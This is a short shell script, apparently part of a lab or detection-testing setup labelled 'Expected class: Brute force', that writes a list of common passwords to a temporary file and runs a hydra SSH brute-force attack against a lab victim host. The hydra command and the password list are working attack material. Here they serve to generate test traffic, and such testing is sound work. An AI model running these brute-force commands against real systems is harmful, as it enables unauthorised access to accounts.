#!/bin/sh
# Expected class: Brute force. Usage: ssh_bruteforce.sh [EXTRA]
# Wordlist is a tiny lab list plus EXTRA generated wrong passwords (default 0); the real password
# (LAB_VICTIM_PASSWORD) is appended last when exported in the environment.
. "$(dirname "$0")/common.sh"
EXTRA="${1:-0}"
case "$EXTRA" in *[!0-9]*|'') echo "usage: $0 [EXTRA]" >&2; exit 1 ;; esac
WL=$(mktemp)
printf '%s\n' password 123456 admin letmein qwerty welcome iloveyou monkey dragon > "$WL"
i=1; while [ "$i" -le "$EXTRA" ]; do echo "guess$i" >> "$WL"; i=$((i + 1)); done
[ -n "$LAB_VICTIM_PASSWORD" ] && echo "$LAB_VICTIM_PASSWORD" >> "$WL"
hydra -l labuser -P "$WL" -t 4 "ssh://$VICTIM_IP"
rm -f "$WL"
